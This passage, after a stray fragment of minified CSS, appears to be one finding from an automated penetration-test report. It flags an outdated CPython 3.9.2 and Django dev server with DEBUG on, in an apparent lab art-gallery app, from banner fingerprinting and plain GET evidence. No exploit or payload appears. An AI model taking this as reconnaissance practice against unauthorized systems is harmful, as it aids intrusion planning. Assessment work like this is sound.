33.333333%;max-width:33.333333%}.col-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-ms-flex-order:-1;order:-1}.order-last{-ms-flex-order:13;order:13}.order-0{-ms-flex-order:0;order:0}.order-1{-ms-flex-order:1;order:1}.order-2{-ms-flex-order:2;order:2}.order-3{-ms-flex-order:3;order:3}.order-4{-ms-flex-order:4;order:4}.order-5{-ms-flex-order:5;order:5}.order-6{-ms-flex-order:6;order:6}.order-7{-ms-flex-order:7;order:7}.order-8{-ms-flex-order:8;order:8}.order-9{-ms-flex-order:9;order:9}.order-10{-ms-flex-order:10;order:10}.order-11{-ms-flex-order:11;order:11}.order-12{-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-sm-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-sm-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-sm-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-sm-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-sm-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-sm-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-sm-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-ms-flex-order:-1;order:-1}.order-sm-last{-ms-flex-order:13;order:13}.order-sm-0{-ms-flex-order:0;order:0}.order-sm-1{-ms-flex-order:1;order:1}.order-sm-2{-ms-flex-order:2;order:2}.order-sm-3{-ms-flex-order:3;order:3}.order-sm-4{-ms-flex-order:4;order:4}.order-sm-5{-ms-flex-order:5;order:5}.order-sm-6{-ms-flex-order:6;order:6}.order-sm-7{-ms-flex-order:7;order:7}.order-sm-8{-ms-flex-order:8;order:8}.order-sm-9{-ms-flex-order:9;order:9}.order-sm-10{-ms-flex-order:10;order:10}.order-sm-11{-ms-flex-order:11;order:11}.order-sm-12{-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-md-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-md-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-md-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-md-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-md-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-md-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-md-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-ms-flex-order:-1;order:-1}.order-md-last{-ms-flex-order:13;order:13}.order-md-0{-ms-flex-order:0;order:0}.order-md-1{-ms-flex-order:1;order:1}.order-md-2{-ms-flex-order:2;order:2}.order-md-3{-ms-flex-order:3;order:3}.order-md-4{-ms-flex-order:4;order:4}.order-md-5{-ms-flex-order:5;order:5}.order-md-6{-ms-flex-order:6;order:6}.order-md-7{-ms-flex-order:7;order:7}.order-md-8{-ms-flex-order:8;order:8}.order-md-9{-ms-flex-order:9;order:9}.order-md-10{-ms-flex-order:10;order:10}.order-md-11{-ms-flex-order:11;order:11}.order-md-12{-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-lg-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-lg-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-lg-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-lg-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-lg-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-lg-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-lg-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-lg-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-lg-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-lg-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.
```

<a id="finding-5"></a>

### 5. [MEDIUM] [vulnerable-component] Outdated / EOL CPython 3.9.2 on Django wsgiref dev server — many known stdlib CVEs (CVE-2023-40217, CVE-2023-24329, CVE-2022-45061, CVE-2020-10735)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32840/

Every HTTP response carries Server: WSGIServer/0.2 CPython/3.9.2, observed via fingerprint_scan on the root and reproduced on app pages. This reveals two things: (1) the Python runtime is CPython 3.9.2 (released Feb 2021), and (2) the app is served by Python's wsgiref simple server — i.e. Django's manage.py runserver development server (the Django technical 404/500 debug pages, e.g. the URLconf leak "ssti_secret_art_gallery.urls", confirm DEBUG=True + runserver). This is a VERSION-BASED finding (matched by the Server banner, NOT exploited here). CPython 3.9.2 is ~4 years of patch releases behind and the entire 3.9 series reached end-of-life in Oct 2025 (now EOL, no further security fixes). 3.9.2 is missing numerous stdlib security fixes shipped in later 3.9.x, including: CVE-2023-40217 (ssl module TLS pre-handshake plaintext-injection / data-after-close; fixed 3.9.18), CVE-2023-24329 (urllib.parse blocklist/SSRF-filter bypass via leading whitespace; fixed 3.9.17), CVE-2022-45061 (IDNA decode quadratic-complexity DoS; fixed 3.9.16), CVE-2020-10735 (int<->str conversion DoS; fixed 3.9.14), plus later items such as CVE-2024-6232 (re/tarfile ReDoS). Worst realistic issue here is CVE-2023-40217 (TLS data injection) → medium. Compounding risk: the wsgiref/runserver dev server is explicitly not production-grade (single-threaded, unhardened, Django docs forbid it in production) and DEBUG=True is on. Operator action: upgrade to a supported Python (3.12/3.13), serve via a real WSGI/ASGI server (gunicorn/uwsgi behind nginx), and set DEBUG=False.

**Reproduction**

```
1. GET http://target.local:32840/ → 200; response header Server: WSGIServer/0.2 CPython/3.9.2 (captured by fingerprint_scan "server: WSGIServer/0.2 CPython/3.9.2"; stable positives ev-mqysv4l4-4e and ev-mqysv4vp-4f, both 200/5013B). 2. Negative control: GET /verdict-nonexistent-xyz → 404 Django technical debug page, distinguishable status/length (ev-mqystcmy-4d, 2392B) — which additionally evidences runserver+DEBUG=True (leaks URLconf ssti_secret_art_gallery.urls). 3. Map version 3.9.2 to the cited CVEs (CVE-2023-40217 / CVE-2023-24329 / CVE-2022-45061 / CVE-2020-10735) and the 3.9 EOL date; these are banner-based, so confirm the runtime version (e.g. with operator access) before relying on any single CVE.
```

**Evidence**

- Evidence `ev-mqystcmy-4d` — `artifacts/_/ev-mqystcmy-4d/`

Request:

```http
GET /verdict-nonexistent-xyz HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 2396
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:49:59 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /verdict-nonexistent-xyz</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32840/verdict-nonexistent-xyz</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_secret_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>verdict-nonexistent-xyz</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

- Evidence `ev-mqysv4l4-4e` — `artifacts/_/ev-mqysv4l4-4e/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 5013
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:51:22 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Art Gallery</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
            </li>
            
            <li class="nav-item">
            <a class="nav-link" href="/accounts/register/step1">Register</a>
            </li>
            <li class="nav-item">
            <a class="nav-link" href="/accounts/login">Login</a>
            </li>
            
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
        </div>
    </nav>
    
    <div class="container">
        
        <h4 class="my-4 text-center">Art objects</h1>
        <div class="gallery">
            
                <div class="gallery-item">
                    <img src="/static/img/r1.jpg" alt="DSC02674_11">
                    <h2>DSC02674_11</h2>
                    <p>Computer Abstract Art Image<br>
                        Price: <b>$ 8.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r2.jpg" alt="Urban street-art">
                    <h2>Urban street-art</h2>
                    <p>graffiti on a wooden construction-wall on Plantage Muidergracht<br>
                        Price: <b>$ 5.6</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r3.jpg" alt="Abstract-9974">
                    <h2>Abstract-9974</h2>
                    <p>Abstract Art Image<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r4.jpg" alt="Art 235">
                    <h2>Art 235</h2>
                    <p>Composite Image<br>
                        Price: <b>$ 4.8</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r5.jpg" alt="Radiographic Image">
                    <h2>Radiographic Image</h2>
                    <p>African Songye Power Figure in the collection of the Indianapolis Museum of Art<br>
                        Price: <b>$ 11.3</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r6.jpg" alt="Abstract00BO">
                    <h2>Abstract00BO</h2>
                    <p>BTerryCompton Abstract Art Image<br>
                        Price: <b>$ 8.4</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r7.jpg" alt="Aliens laughing">
                    <h2>Aliens laughing</h2>
                    <p>Young gray aliens reading books, laughing<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r8.jpg" alt="Flower #56">
                    <h2>Flower #56</h2>
                    <p>134 flowers Sea Lavender Art<br>
                        Price: <b>$ 9.0</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r9.jpg" alt="White Wolves">
                    <h2>White Wolves</h2>
                    <p>CPM Art Challenge Photo White Wolves, 2013<br>
                        Price: <b>$ 7.3</b></p>
                </div>
            
        </div>
    </div>


    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqysv4vp-4f` — `artifacts/_/ev-mqysv4vp-4f/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 5013
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:51:22 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Art Gallery</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
            </li>
            
            <li class="nav-item">
            <a class="nav-link" href="/accounts/register/step1">Register</a>
            </li>
            <li class="nav-item">
            <a class="nav-link" href="/accounts/login">Login</a>
            </li>
            
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
        </div>
    </nav>
    
    <div class="container">
        
        <h4 class="my-4 text-center">Art objects</h1>
        <div class="gallery">
            
                <div class="gallery-item">
                    <img src="/static/img/r1.jpg" alt="DSC02674_11">
                    <h2>DSC02674_11</h2>
                    <p>Computer Abstract Art Image<br>
                        Price: <b>$ 8.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r2.jpg" alt="Urban street-art">
                    <h2>Urban street-art</h2>
                    <p>graffiti on a wooden construction-wall on Plantage Muidergracht<br>
                        Price: <b>$ 5.6</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r3.jpg" alt="Abstract-9974">
                    <h2>Abstract-9974</h2>
                    <p>Abstract Art Image<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r4.jpg" alt="Art 235">
                    <h2>Art 235</h2>
                    <p>Composite Image<br>
                        Price: <b>$ 4.8</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r5.jpg" alt="Radiographic Image">
                    <h2>Radiographic Image</h2>
                    <p>African Songye Power Figure in the collection of the Indianapolis Museum of Art<br>
                        Price: <b>$ 11.3</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r6.jpg" alt="Abstract00BO">
                    <h2>Abstract00BO</h2>
                    <p>BTerryCompton Abstract Art Image<br>
                        Price: <b>$ 8.4</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r7.jpg" alt="Aliens laughing">
                    <h2>Aliens laughing</h2>
                    <p>Young gray aliens reading books, laughing<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r8.jpg" alt="Flower #56">
                    <h2>Flower #56</h2>
                    <p>134 flowers Sea Lavender Art<br>
                        Price: <b>$ 9.0</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r9.jpg" alt="White Wolves">
                    <h2>White Wolves</h2>
                    <p>CPM Art Challenge Photo White Wolves, 2013<br>
                        Price: <b>$ 7.3</b></p>
                </div>
            
        </div>
    </div>


    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```
